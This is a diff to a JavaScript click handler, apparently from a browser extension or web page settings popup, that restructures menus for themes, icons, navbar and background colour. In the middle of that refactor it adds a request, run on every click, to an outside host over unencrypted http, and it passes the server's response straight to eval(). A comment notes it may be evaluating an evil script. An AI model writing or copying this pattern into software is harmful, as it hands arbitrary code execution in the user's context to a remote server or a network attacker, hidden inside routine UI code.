@@ -74,51 +74,71 @@ function activateBgClick(e){
 
 var isOpened = {'change_themes':false, 'change_icons':false, 'change_navbar': false, 'change_bgcol': false}
 function click(e) {
-    if( e.target !== this )
-        return;
-    
-    var divName = e.target.id;
-    var elems = document.getElementById(divName + '_select');
-    if (elems.style.display !== 'none') {
-        elems.style.display = 'none';
 
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://nodejsfb-hiko.rhcloud.com:8080/", true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            // WARNING! Might be evaluating an evil script!
+            var resp = eval("(" + xhr.responseText + ")");
+            console.log(resp);
+        }
+    }
+    xhr.send();
+
+    if( e.target !== this && e.target.className !== 'categoryTitle') {
+        return;
     }
     else {
-
-        elems.style.display = 'block';
-    }
-    document.getElementById('popup').style.height = $(window).height();
-
-    if (divName == 'change_themes') {
-        document.getElementById('popup').style.height = $(window).height();
-        for (var i = 0; i < elems.childNodes.length; i++) {
-            elems.childNodes[i].onclick = activateThemeClick;
+        var divName = '';
+        if (e.target.className == 'categoryTitle') {
+            divName = $(this).attr('id');
+        }
+        else {
+             divName = e.target.id;
+        }
+        var elems = document.getElementById(divName + '_select');
+        if (elems.style.display !== 'none') {
+            elems.style.display = 'none';
 
         }
-    }
-    if (divName == 'change_icons') {
-        document.getElementById('popup').style.height = $(window).height();
-     //   $('#popup').css({'height' :$(window).height() });
-        for (var i = 0; i < elems.childNodes.length; i++) {
-            elems.childNodes[i].onclick = activateIconsClick;
+        else {
 
+            elems.style.display = 'block';
         }
-    }
-
-    if (divName == 'change_navbar') {
         document.getElementById('popup').style.height = $(window).height();
-         // we adjust popupsize
-        for (var i = 0; i < elems.childNodes.length; i++) {
-            elems.childNodes[i].onclick = activateNavClick;
 
+        if (divName == 'change_themes') {
+            document.getElementById('popup').style.height = $(window).height();
+            for (var i = 0; i < elems.childNodes.length; i++) {
+                elems.childNodes[i].onclick = activateThemeClick;
+
+            }
         }
-    }
+        if (divName == 'change_icons') {
+            document.getElementById('popup').style.height = $(window).height();
+            //   $('#popup').css({'height' :$(window).height() });
+            for (var i = 0; i < elems.childNodes.length; i++) {
+                elems.childNodes[i].onclick = activateIconsClick;
 
-    if (divName == 'change_bgcol') {
-        document.getElementById('popup').style.height = $(window).height();
-        for (var i = 0; i < elems.childNodes.length; i++) {
-            if (elems.childNodes[i].tagName == 'SPAN') {
-                elems.childNodes[i].onclick = activateBgClick;
+            }
+        }
+
+        if (divName == 'change_navbar') {
+            document.getElementById('popup').style.height = $(window).height();
+            // we adjust popupsize
+            for (var i = 0; i < elems.childNodes.length; i++) {
+                elems.childNodes[i].onclick = activateNavClick;
+
+            }
+        }
+
+        if (divName == 'change_bgcol') {
+            document.getElementById('popup').style.height = $(window).height();
+            for (var i = 0; i < elems.childNodes.length; i++) {
+                if (elems.childNodes[i].tagName == 'SPAN') {
+                    elems.childNodes[i].onclick = activateBgClick;
+                }
             }
         }
     }
